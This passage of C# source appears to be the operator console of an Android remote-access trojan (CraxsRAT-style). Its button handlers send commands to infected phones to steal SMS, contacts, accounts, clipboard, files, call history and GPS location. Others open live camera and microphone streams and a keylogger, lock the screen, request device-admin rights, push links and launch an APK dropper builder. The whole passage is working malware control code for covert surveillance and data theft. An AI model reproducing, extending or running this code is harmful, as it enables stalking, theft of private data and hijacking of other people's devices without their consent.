                    if (selectedRow.Cells[8].Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon27_Click(object sender, EventArgs e)
    {

        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        TcpClient myClient = client.myClient;
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon12_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client == null)
                        continue;
                    TcpClient myClient = client.myClient;
                    string[] array = client.Keys.Split(':');
                    int num = 0;
                    int num2 = 0;
                    if (client.Isv4)
                    {
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                    else
                    {
                        string name = "Camera_Manager_" + client.ClientRemoteAddress;
                        CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
                        if (cameraManager != null)
                            break;
                        cameraManager = new CameraManager();
                        cameraManager.Name = name;
                        cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
                        cameraManager.classClient = client;
                        if (cameraManager.classClient != null)
                        {
                            reso.Directory_Exist(cameraManager.classClient);
                            cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
                        }
                        cameraManager.Client = client.myClient;
                        cameraManager.classCamera = client;
                        cameraManager.TempImage = new PictureBox();
                        cameraManager.combotext.Visible = false;
                        cameraManager.combosizes.Visible = false;
                        cameraManager.Show();
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon2_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Cells[8].Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client == null)
                        continue;
                    TcpClient myClient = client.myClient;
                    string name = "Microphone_" + client.ClientRemoteAddress;
                    /*Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
                    if (microphone == null)*/
                    {
                        string[] array = client.Keys.Split(':');
                        if (array.Length < infoServer.KeySize)
                            break;
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon35_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        string name = "Keylogger_" + client.ClientRemoteAddress;
                        Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
                        if (client != null && keylogger == null)
                        {
                            keylogger = new Keylogger();
                            keylogger.Name = name;
                            keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
                            keylogger.Client = client.myClient;
                            keylogger.classClient = client;
                            keylogger.DGV0.Columns[3].Width = 48;
                            keylogger.DGV0.Columns[3].DisplayIndex = 0;
                            keylogger.tmpAddressIP = client.ClientAddressIP;
                            keylogger.tmpClientName = client.ClientName;
                            keylogger.tmpCountry = client.Country;
                            keylogger.tmpFolderUSER = client.FolderUSER;
                            client.Keylogg = true;
                            keylogger.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon30_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Cells[8].Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon38_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        TcpClient myClient = client.myClient;
                        Dialog1 dialog = new Dialog1();
                        dialog.Title = "Enter Link";
                        dialog.ShowDialog();
                        if (dialog.DialogResult != DialogResult.OK)
                            break;
                        string[] array = client.Keys.Split(':');
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon29_Click(object sender, EventArgs e)
    {
        try
        {
            if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
                return;
            Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
            if (client.isconnected)
            {
                TcpClient myClient = client.myClient;
                Dialog1 dialog = new Dialog1();
                dialog.Title = "Enter Messege";
                dialog.ShowDialog();
                if (dialog.DialogResult == DialogResult.OK)
                {
                    string[] array = client.Keys.Split(':');
                    object[] parametersObjects = new object[4]
                    {
                        myClient,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        client
                    };
                    client.SendMessage(parametersObjects);
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon26_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Cells[8].Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon24_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Notifications_" + client.ClientAddressIP;
                        Craxspopup Eaglepopup = (Craxspopup)MyProject.Application.OpenForms[name];
                        if (Eaglepopup == null)
                        {
                            Eaglepopup = new Craxspopup();
                            Eaglepopup.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
                            Eaglepopup.ClassClient = client;
                            Eaglepopup.Show();
                            selectedRow.Cells[8].Value = Codes.BlankImage();
                        }
                    }
                }
            
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon21_Click(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon34_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            string[] array = client.Keys.Split(':');
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                   SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon23_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon15_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            object[] parametersObjects = new object[4]
                            {
                                client.myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon31_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            string[] array = client.Keys.Split(':');
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                string.Concat(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>", Data.SPL_SOCKET, array[0], Data.SPL_SOCKET, array[1], Data.SPL_SOCKET, SecurityKey.Lockscreen, Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Data.SPL_ARRAY, Data.SPL_SOCKET, client.ClientRemoteAddress),
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon25_Click(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon37_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "SelfRemove_" + client.ClientAddressIP;
                        SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
                        if (selfRemove == null)
                        {
                            selfRemove = new SelfRemove();
                            selfRemove.Classclient = client;
                            selfRemove.Show();
                        }
                        else
                            selfRemove.BringToFront();
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon28_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon36_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            string[] array = client.Keys.Split(':');
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                   SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKeb" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void Guna2GradientButton20_Click(object sender, EventArgs e)
    {


    }

    private void ClientsButton_Click(object sender, EventArgs e)
    {
        ClientsWindow.BringToFront();

    }

    private void ClientsLogs_Click(object sender, EventArgs e)
    {
        DataLog.BringToFront();
        DataLog.Visible = true;
    }

    private void guna2GradientButton3_Click(object sender, EventArgs e)
    {
        DGVblocked.BringToFront();
    }

    private void guna2GradientButton4_Click(object sender, EventArgs e)
    {
    }

    private void Guna2GradientButton22_Click(object sender, EventArgs e)
    {
       
    }

    private void panel1_MouseDown_1(object sender, MouseEventArgs e)
    {
        try
        {
            if (e.Button == MouseButtons.Left)
            {
                Codes.ReleaseCapture();
                Codes.SendMessage(base.Handle, 161, 2, 0);
            }
        }
        catch (Exception)
        {
        }
    }

    private void guna2GradientButton5_Click(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
    {
        Drooper ApkD = new Drooper();

        // Show Form2
        ApkD.Show();
    }

    private void Guna2Button5_Click(object sender, EventArgs e)
    {
        this.Close();
    }

    private void PictureBox9_Click(object sender, EventArgs e)
    {
        this.WindowState = FormWindowState.Minimized;
    }

    private void LiveScreenControlToolsTrip_Click(object sender, EventArgs e)
    {

    }

    private void FileManagerToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            object[] parametersObjects = new object[4]
                            {
                                client.myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void LiveCameraStreamToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client == null)
                        continue;
                    TcpClient myClient = client.myClient;
                    string[] array = client.Keys.Split(':');
                    int num = 0;
                    int num2 = 0;
                    if (client.Isv4)
                    {
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                    else
                    {
                        string name = "Camera_Manager_" + client.ClientRemoteAddress;
                        CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
                        if (cameraManager != null)
                            break;
                        cameraManager = new CameraManager();
                        cameraManager.Name = name;
                        cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
                        cameraManager.classClient = client;
                        if (cameraManager.classClient != null)
                        {
                            reso.Directory_Exist(cameraManager.classClient);
                            cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
                        }
                        cameraManager.Client = client.myClient;
                        cameraManager.classCamera = client;
                        cameraManager.TempImage = new PictureBox();
                        cameraManager.combotext.Visible = false;
                        cameraManager.combosizes.Visible = false;
                        cameraManager.Show();
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

   
    private void LiveMicrophoneToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client == null)
                        continue;
                    TcpClient myClient = client.myClient;
                    string name = "Microphone_" + client.ClientRemoteAddress;
                    /*Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
                    if (microphone == null)*/
                    {
                        string[] array = client.Keys.Split(':');
                        if (array.Length < infoServer.KeySize)
                            break;
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ScreenReaderToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "SC_Readv2_" + client.ClientAddressIP;
                        ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
                        if (screenReaderV == null)
                        {
                            screenReaderV = new ScreenReaderV2();
                            screenReaderV.Name = name;
                            screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
                            screenReaderV.Tag = client.ClientRemoteAddress;
                            screenReaderV.classClient = client;
                            screenReaderV.Client = client.myClient;
                            screenReaderV.DownloadsFolder = client.FolderUSER;
                            screenReaderV.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void LiveLocationToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ScreenLoggerToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Screen_Reader_" + client.ClientRemoteAddress;
                        ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
                        if (screenReader == null)
                        {
                            screenReader = new ScreenReader();
                            screenReader.Name = name;
                            screenReader.Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP);
                            screenReader.Tag = client.ClientRemoteAddress;
                            screenReader.Classclient = client;
                            screenReader.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void CallsHistoryToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
